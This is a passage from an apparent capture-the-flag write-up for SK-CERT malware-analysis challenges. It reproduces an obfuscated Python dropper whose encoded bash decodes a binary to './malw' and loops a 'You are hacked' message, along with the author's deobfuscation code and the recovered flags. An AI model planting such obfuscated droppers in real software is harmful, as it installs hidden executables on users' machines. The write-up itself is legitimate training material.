+</span></span></span><span style=display:flex><span><span style=color:#e6db74>p5OUGRyPD63lYwVhADOsMJEuqTRNK7McozxNK64mqTSwn64wnTgsMzScoROUGRyPD63lYwDNpUWc
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>oaEzDRqZFHWQKmVhZv96NS4sMTS5LI4mqTSlqNOmqUWwoKONE5kWDxAsZv9lYwHNK64aoJ4hK8A5
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>LKW5K63NK64xp74snTShMTkyNS4WG64mqTEcoy46p7IxNS4yozDNK64vp8Asp8EupaDNoJScotOs
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>K7ymo7Z0BI4mL7ShMxOUGRyPD63lYwpNK64HGHAsEH0RK63NK5yHGI4lMJqcp8EypyEAD7kiozIH
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>LJWfMDOmoTIypROUGRyPD63lYwVhADOsK7A9LI4znJ0uoTy1MHOUGRyPD63lYwVhADOsnJ0cqNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>YaA0oKEuLtNhp8ElqTSvNP0mnUA5paEuLtNhoz45MF0aoaHhpUWipTIlqUxNYz0iqTHhM706YzW6
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>nJkxYJyxNP0coaEypaNNYzqhqF0bLKAbNP0xrJ0mrJ5NYzE0oaA5ptNhM706YaMypaAco79NYzqh
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>qF07MKWmnJ4hK8VNYaWyoTRhMUyhNP0lMJkuYaOfqNNhnJ0cqNNhpTk5YzqiqNNhpTk5YaAyLjNh
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>qTI9qNNhMzyhnDNhpz4xLKEuNP0ynS4zpzSgMI4bMUVNYzIbK7MlLJ6yNP0ho8EyYxSPFF65LJpN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>Yz0iqTHhpTSwn7SaMDNhnJ0cqS4upaWurDNhMzyhnI4upaWurDNhMUyhLJ6cLjNhMTS5LDNhLaAm
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NP0wo76gMJ05NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNNNNNNNNNNNNOfNNNNUNNNNNtNNNNNNNNODNjNNNNNNNSNQNNNNNNNNZNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNtNNNNNNNNNNNNNNNNNNNNhNNNNOjNNNNVNNNNNNNNNtNZNNNNNNNPNNjNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNPDNNNNNNNNNNNNNNNNNNNNRNNNNNNNNNNNNNNNNNNNNDDNNNNRNNNNPNNNNNNNNNXDQNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNcNZNNNNNNNNpNNNNNNNNNNNNNNNNNNNNNDNNNNNNNNNNNNNNNNNNNRxNNNQ7//4iNtNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNQNNjNNNNNNNZNQNNNNNNNNWNNNNNNNNNNSNNNNNNNNNNtNNNNNNNNNNNNNNNNNNNOGNNNNPjNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNVNNNNNNNNN1NZNNNNNNNQbNjNNNNNNNPNONNNNNNNNOtNNNNRNNNNVNNNNNNNNNOtNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>JjNNNNZNNNNPNNNNNNNNNNtSNNNNNNNNPNHNNNNNNNQINNNNNNNNNNNNNNNNNNNNNDNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNTZNNNQ///4iNtNNNNNNNNQrODNNNNNNNA9SNNNNNNNNTNNNNNNNNNNSNNNNNNNNNNVN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNtNNNNNNNNOjNNNN/i//ojVNNNNNNNNN_NHNNNNNNNQ9ODNNNNNNNSNNNNNNNNNNOtNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNRNNNNVNNNNNNNNNNNNNNNNNNNNsjNNNNDNNNNPNNNNNNNNNRtTNNNNNNNNFNLNNNNNNNQNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNHNNNNNNNNNPNNNNNNNNNNLNNNNNNNNNVxNNNNRNNNNDtNNNNNNNNNVOjNNNNNNNNtUNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNxNNNNNNNNNNSNNNNTDNNNNtNNNNNNNNNTNNNNNNNNNPGNNNNNDNNNNLNNNNNNNNNNONNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNRNNNNNNNNOfNNNNNNNNNNNNNNNNNNNNRNNNNNNNNNNNNNNNNNNNNwtNNNNRNNNNTNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NPNDNNNNNNNNVONNNNNNNNOjNNNNNNNNNNNNNNNNNNNNRNNNNNNNNNNDNNNNNNNNNWxNNNNONNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>OtNNNNNNNNPDRNNNNNNNNWNDNNNNNNNNRNNNNNNNNNNNNNNNNNNNNONNNNNNNNNNRNNNNNNNNNPv
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNDNNNNLNNNNNNNNNbONNNNNNNNPtRNNNNNNNNTNNNNNNNNNNNNNNNNNNNNNDNNNNNNNNNONN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNdjNNNNRNNNNTNNNNNNNNNNNENNNNNNNNNORNNNNNNNPlNtNNNNNNNNNNNNNNNNNNRNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNYRNNNNONNNNOtNNNNNNNNP5RjNNNNNNNYDGNNNNNNNNQDNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNDNNNNNNNNNNNNNNNNNNNP8NNNNNDNNNNVNNNNNNNNNNPNNNNNNNNNNVNNNNNNNNTjNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNRNNNNNNNNNNNNNNNNNNNNijNNNNRNNNNPNNNNNNNNNTjtNNNNNNNNoPNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNN5NNNNNNNNNNNNNNNNNNNNONNNNNNNNNNNNNNNNNNNNZ5NNNNONNNNNtNNNNNNNNPtVNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NXNtNNNNNNNNeNNNNNNNNNNNNNNNNNNNNNtNNNNNNNNNNNNNNNNNNNQKNNNNOjNNNNVNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>GPRNNNNNNNOZVDNNNNNNNPNNNNNNNNNNNNNNNNNNNNNRNNNNNNNNNNNNNNNNNNNN0DNNNNpNNNNP
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNTjuNNNNNNNNoPRNNNNNNNOjNNNNNNNNNNNNNNNNNNNNONNNNNNNNNNNNNNNNNNNNCZN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNBNNNNNjNNNNNNNNPDCDNNNNNNNWNgNNNNNNNNPNNNNNNNNNNNNNNNNNNNNNtNNNNNNNNNPNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNQ/NNNNQjNNNNZNNNNNNNNNzQ5NNNNNNNPLYDNNNNNNNNtNNNNNNNNNNNNNNNNNNNNVNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNtNNNNNNNNNPjRNNNLNNNNQNNNNNNNNNXN4NNNNNNNNbP5NNNNNNNQjNDNNNNNNNNLNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNPNNNNNNNNNNDNNNNNNNNNW5NNNNONNNNNjNNNNNNNNPDCjNNNNNNNWNiNNNNNNNNpNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNtNNNNNNNNNPNNNNNNNNNNHNDNNNDNNNNZNNNNNNNNNNRNNNNNNNNNNZNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NONNNNNNNNNNNNNNNNNNNNNVNNNNNNNNNNNNNNNNNNNNTtRNNNtNNNNQNNNNNNNNNOONNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>RQNNNNNNNNNVNNNNNNNNNNNNNNNNNNNNNDNNNNNNNNNNNNNNNNNNNO3ONNNONNNNZNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNONjNNNNNNNNWtNNNNNNNNNNNNNNNNNNNNRNNNNNNNNNNDNNNNNNNNNONNNNNtNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNNNNNN9ZNNNNNNNNAtQNNNNNNNNUtNNNOVNNNNVNNNNNNNNNOtNNNNNNNNNPDNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNZNNNNNNNNNNNNNNNNNNNNNNNNNRQDNNNNNNNOQNtNNNNNNNNNNNNNNNNNNNDNNNNNNNNNNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNORNNNNQNNNNNNNNNNNNNNNNNNNNNNNNNSZ7NNNNNNNNXNRNNNNNNNNNNNNNNNNNNNRNNNNN
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>NNNNNNNNNNNNNNN-&#39; | onfr19 !q &gt; ./znyj
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>juvyr gehr; qb
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>    rpub &#34;Lbh ner unpxrq+&#34;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>    fyrrc 6
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>qbar
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>&#34;&#34;&#34;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>command1 <span style=color:#f92672>=</span> deobfuscate3(deobfuscate2(deobfuscate1(command1)))
+</span></span><span style=display:flex><span>command2 <span style=color:#f92672>=</span> deobfuscate3(deobfuscate2(deobfuscate1(command2)))
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>data <span style=color:#f92672>=</span> deobfuscate3(deobfuscate2(deobfuscate1(data)))
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e># time.sleep(31536000)</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e># with open(&#34;lol.sh&#34;, &#34;w&#34;) as f:</span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># f.write(data)</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e># os.system(command1)</span>
+</span></span><span style=display:flex><span><span style=color:#75715e># os.system(command2)</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>print(command1)
+</span></span><span style=display:flex><span>print(command2)
+</span></span><span style=display:flex><span>print(data)
+</span></span></code></pre></div><p>the results are clear and juicy!</p><pre tabindex=0><code>SK-CERT{0bfu5c4710n_4nd_5l33p}
+</code></pre><h2 id=bash-dropper>Bash dropper</h2><p><em>Description</em></p><blockquote><p>It looks like the python script created new bash file. Take a look. Flag is in format SK-CERT{&mldr;} and is hidden inside bash script.</p></blockquote><p><em>Solution</em></p><p>Already printed in the first part of the challenge, the flag is in the bash script:</p><pre tabindex=0><code>SK-CERT{1_w1ll_l34v3_y0u_50m37h1n6_h3r3}
+</code></pre><h2 id=password-protected>Password protected</h2><p><em>Description</em></p><blockquote><p>It appears that the bash script left another executable on your system. It also seems to be password-protected. I don&rsquo;t know the password, but I&rsquo;m really curious about what secrets this file holds. The flag is in the format SK-CERT{&mldr;}. There are multiple ways to obtain the flag. For example, you can use static analysis of the binary to either read the flag from its data or find a hardcoded password. Alternatively, you can use dynamic analysis or binary patching.</p></blockquote><p>Solution</p><p>Analyze malw binary, that was extracted from the bash script, I used IDA - iand got this as flag.</p><pre tabindex=0><code>SK-CERT{h4rdc0d3d_pl41n73x7}
+</code></pre><hr><blockquote><p>On this chapter that was what i could solve.The others were a bit tricky to me</p></blockquote><h2 id=happy-hacking><em><strong>Happy Hacking!!!!</strong></em></h2></span></article></div></main></div><footer><div class="flex flex-col justify-center p-10"><p class="text-center text-slate-700 dark:text-slate-400">&copy;
+2025
+Richie-Havoc</p><p class="text-center text-sm text-slate-700 dark:text-slate-400">Powered by <a class="hover:underline hover:decoration-indigo-500 hover:text-indigo-500" href=https://gohugo.io target=_blank rel="noopener noreferrer">Hugo</a> & <a class="hover:underline hover:decoration-indigo-500 hover:text-indigo-500" href=https://github.com/chrede88/qubt target=_blank rel="noopener noreferrer">Qubt</a></p></div></footer></body></html>
